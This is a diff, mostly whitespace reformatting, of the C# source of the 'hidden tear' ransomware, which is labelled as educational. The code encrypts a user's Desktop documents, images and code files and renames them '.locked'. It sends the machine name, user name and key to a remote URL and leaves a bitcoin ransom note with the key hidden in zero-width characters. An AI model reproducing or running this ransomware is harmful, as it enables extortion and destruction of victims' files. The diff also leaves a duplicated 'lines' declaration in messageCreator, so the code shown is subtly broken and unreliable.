@@ -1,20 +1,20 @@
 ﻿/*
- _     _     _     _              _
-| |   (_)   | |   | |            | |
-| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __
+ _     _     _     _              _                  
+| |   (_)   | |   | |            | |                 
+| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
 | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
-| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |
-|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|
-
- * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com
+| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
+|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
+ 
+ * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
  * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
  * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
- *
- * Ve durdu saatler
+ * 
+ * Ve durdu saatler 
  * Susuyor seni zaman
  * Sesin dondu kulagimda
  * Dedi uykudan uyan
- *
+ * 
  * Yine boyle bir aksamdi
  * Sen guluyordun ya gozlerimin icine
  * Feslegenler boy vermisti
@@ -40,7 +40,6 @@ using Microsoft.Win32;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 
-
 namespace hidden_tear
 {
     public partial class Form1 : Form
@@ -50,10 +49,8 @@ namespace hidden_tear
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
-		string password;
         int sendControl = 0;
-
-
+        string password;
 
         public Form1()
         {
@@ -66,7 +63,6 @@ namespace hidden_tear
             this.ShowInTaskbar = false;
             //starts encryption at form load
             startAction();
-
         }
 
         private void Form_Shown(object sender, EventArgs e)
@@ -98,6 +94,7 @@ namespace hidden_tear
                         cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                         cs.Close();
                     }
+
                     encryptedBytes = ms.ToArray();
                 }
             }
@@ -111,15 +108,15 @@ namespace hidden_tear
             const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
             StringBuilder res = new StringBuilder();
             Random rnd = new Random();
-            while (0 < length--){
+            while (0 < length--) {
                 res.Append(valid[rnd.Next(valid.Length)]);
             }
+
             return res.ToString();
         }
 
         //Sends created password target location
-        public void SendPassword(string password){
-
+        public void SendPassword(string password) {
             string info = computerName + "-" + userName + " " + password;
             var fullUrl = targetURL + info;
             var conent = new System.Net.WebClient().DownloadString(fullUrl);
@@ -128,7 +125,6 @@ namespace hidden_tear
         //Encrypts single file
         public void EncryptFile(string file, string password)
         {
-
             byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
             byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
 
@@ -141,8 +137,6 @@ namespace hidden_tear
             System.IO.File.Move(file, file+".locked");
 
             passwordBytes = null;
-
-
         }
 
         //encrypts target directory
@@ -152,24 +146,26 @@ namespace hidden_tear
             //extensions to be encrypt
             var validExtensions = new[]
             {
+
                 ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
             };
 
             string[] files = Directory.GetFiles(location);
             string[] childDirectories = Directory.GetDirectories(location);
-            for (int i = 0; i < files.Length; i++){
+            for (int i = 0; i < files.Length; i++) {
                 string extension = Path.GetExtension(files[i]);
                 if (validExtensions.Contains(extension))
                 {
-                    EncryptFile(files[i],password);
+                    EncryptFile(files[i], password);
                 }
             }
-            for (int i = 0; i < childDirectories.Length; i++){
+
+            for (int i = 0; i < childDirectories.Length; i++) {
                 encryptDirectory(childDirectories[i]);
             }
+
             if (sendControl == 0)
             {
-
                 SendPassword(password);
                 sendControl++;
             }
@@ -177,30 +173,30 @@ namespace hidden_tear
 
         public void startAction()
         {
-
             string path = "\\Desktop";
             string startPath = userDir + userName + path;
             encryptDirectory(startPath);
             messageCreator();
-			password = null;
-			System.Windows.Forms.Application.Exit();
+            password = null;
+            System.Windows.Forms.Application.Exit();
         }
 
         public void messageCreator()
         {
             string path = "\\Desktop\\READ_IT.txt";
             string fullpath = userDir + userName + path;
-	        char bin0 = '\u200B'; // ZERO WIDTH SPACE
-	        char bin1 = '\u180E'; // MONGOLIAN VOWEL SEPARATOR
             string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk.", "" };
-	        string NSA_KEY = "";
-			for (int x = 0;x < password.Length;x++) {
-				string bin = Convert.ToString(password[x], 2);
-				for (int i = 0;i < 8;i++)
-					NSA_KEY += bin[i] == '1' ? bin1 : bin0;
-			}
-	        lines[lines.Length - 1] = NSA_KEY;
-			System.IO.File.WriteAllLines(fullpath, lines);
+            char bin0 = '\u200B'; // ZERO WIDTH SPACE
+            char bin1 = '\u180E'; // MONGOLIAN VOWEL SEPARATOR
+            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk.", "" };
+            string NSA_KEY = "";
+            for (int x = 0;x < password.Length;x++) {
+                string bin = Convert.ToString(password[x], 2);
+                for (int i = 0;i < 8;i++)
+                    NSA_KEY += bin[i] == '1' ? bin1 : bin0;
+            }
+            lines[lines.Length - 1] = NSA_KEY;
+            System.IO.File.WriteAllLines(fullpath, lines);
         }
     }
 }
